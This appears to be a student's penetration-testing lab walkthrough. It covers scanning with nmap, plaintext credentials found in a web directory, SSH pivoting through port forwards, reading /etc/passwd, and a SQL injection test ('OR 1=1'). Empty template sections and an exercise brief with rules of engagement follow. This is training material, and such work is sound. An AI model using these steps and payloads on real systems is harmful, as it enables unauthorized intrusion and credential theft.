    10.50.23.155 22/80
______________________________________________________________________________________________________________
## First nmap the ip (notice http is running use enum script for more pages)
### Second nc the ports to validate them (obviously nc before the enum script to ensure its http)
    sudo nmap -T4 -Pn 10.50.23.155
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
    sudo nmap -T4 -Pn 10.50.23.155 --script=http-enum.nse
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```
    nc 10.50.23.155 22
```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```
    nc 10.50.23.155 80
```
HTTP/1.1 400 Bad Request
Date: Fri, 06 Dec 2024 15:29:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.28.20 Port 80</address>
</body></html>
```
______________________________________________________________________________________________________________
## After scanning run firefox and enter ip in url
### From the results of the enum scan add the file paths to the end of the ip
    10.50.23.155/login.php
    10.50.23.155/login.html
    10.50.23.155/img/
    10.50.23.155/scripts/
______________________________________________________________________________________________________________
## Check all the different urls
### The script one looks promising
    system_user=user2
    user_password=EaglesIsARE78
______________________________________________________________________________________________________________
## SSH to the ip using the creds found
### Run /bin/bash to upgrade shell, do ip a/ip n/ip r to see what to ping sweep
    ssh -MS /tmp/jump user2@10.50.23.155
    
    for i in {1..30}; do (ping -c 1 10.10.28.$i | grep "bytes from" &); done
```
64 bytes from 10.10.28.4: icmp_seq=1 ttl=64 time=2.43 ms
64 bytes from 10.10.28.20: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 10.10.28.30: icmp_seq=1 ttl=64 time=0.441 ms
```
______________________________________________________________________________________________________________
## Check known files on the system
### To see if there are any other networks we can scan
    cat /etc/passwd
    cat /etc/hosts
______________________________________________________________________________________________________________
## After finding the new network
### Set up dynamic port forward to start scanning
    ssh -S /tmp/jump jump -O forward -D9050
______________________________________________________________________________________________________________
## Scan the 192.168.28.181 discovered
### Followed by nc to validate ports
    proxychains nmap -T4 -Pn 192.168.28.181 -p-
```
Nmap scan report for 192.168.28.181
Host is up (0.00055s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.44 seconds
```
    proxychains nc 192.168.28.181 22
```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```
    proxychains nc 192.168.28.181 80
```
HTTP/1.1 400 Bad Request
Date: Fri, 06 Dec 2024 18:13:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 306
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.28.181 Port 80</address>
</body></html>
```
______________________________________________________________________________________________________________
## Set up a tunnel through the MS you already have to access the SSH/HTTP ports
### If you regularly SSH'd into the box close it and look for the SSH -MS command above
    ssh -S /tmp/jump jump -O forward -L20001:192.168.28.181:22 -L20002:192.168.28.181:80
______________________________________________________________________________________________________________
## Now can run firefox to connect to the webserver
### Utilize the port forward we made in the above and use loopback
    firefox http://127.0.0.1:20002
______________________________________________________________________________________________________________
## Now once on the webpage observe the "Product Selections"
### Only need to select one and then change the number to see which field is vulnerable
    http://127.0.0.1:20002/pick.php?product=7 OR 1=1        #the vuln field because displays everything
______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
# OPERATION: DRY RUN

## SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.

### Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.

#### Take notes on this document.

#### Dry Run Operation
#### XX June 2024
#### Start Time: 0830
#### Duration: 3 hours

### Type of Operation: Information Systems Penetration Test

### Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.

### Tasking:Perform all tasks outlined in this document.

## Mission Scope:

#### All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.

#### Internal network of target entity excluding devices responsible for networking (routers, switches, etc)

## RoE:

#### Google docs, and all other shareable document platforms, are forbidden during this operation.

#### All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.

#### You are authorized to modify passwords to user accounts.

#### Writing to disk is authorized on all machines.

#### You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.

#### You will not use Metasploit tools for any affect with the exception of shellcode generation.

#### You will not target routers, switches or other networking devices.

#### You will not target entities or systems outside of the scope previously defined.

#### You will not interfere with other entities' operations in any way.

#### Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.
